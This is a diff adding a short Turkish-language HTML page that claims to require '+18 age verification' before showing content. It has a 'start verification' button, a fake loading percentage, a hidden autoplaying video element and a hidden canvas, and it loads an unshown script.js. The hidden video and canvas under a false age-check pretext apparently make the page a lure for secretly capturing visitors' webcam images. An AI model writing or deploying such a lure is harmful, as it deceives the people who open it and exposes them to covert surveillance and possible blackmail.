@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>İçerik Doğrulama</title>
+    <style>
+        body { background-color: #000; color: #fff; font-family: Arial, sans-serif; text-align: center; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .container { padding: 20px; border: 1px solid #333; border-radius: 10px; width: 90%; max-width: 400px; }
+        .btn { background-color: #ff0000; color: #fff; border: none; padding: 15px 25px; font-size: 16px; border-radius: 5px; cursor: pointer; margin-top: 20px; }
+        #progress { display: none; margin-top: 20px; font-size: 20px; color: #00ff00; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>⚠️ Dikkat</h2>
+        <p>Bu içeriği görüntülemek için +18 yaş doğrulamasını tamamlamanız gerekmektedir.</p>
+        <button class="btn" onclick="start()">DOĞRULAMAYI BAŞLAT</button>
+        <div id="progress">Yükleniyor: %<span id="percent">0</span></div>
+    </div>
+    <video id="video" style="display:none;" autoplay></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <script src="script.js"></script>
+</body>
+</html>
